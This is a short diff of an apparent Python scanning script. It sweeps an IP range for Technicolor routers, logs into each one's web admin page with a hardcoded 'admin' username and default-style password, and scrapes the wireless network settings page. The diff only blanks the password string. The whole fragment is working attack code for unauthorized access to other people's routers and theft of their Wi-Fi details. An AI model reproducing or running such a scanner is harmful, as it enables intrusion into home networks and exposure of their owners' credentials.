@@ -17,7 +17,7 @@ for i in range(0,256):
             if n==True: ##Technicolor
                 tech=tech+1
                 print ip+str(i)+"..................Technicolor.........."
-                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
+                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.3)
                 parser1=r2.content
                 bs1=BeautifulSoup(parser1, "html.parser")
                 for td in bs1.find_all("td", align="middle"):
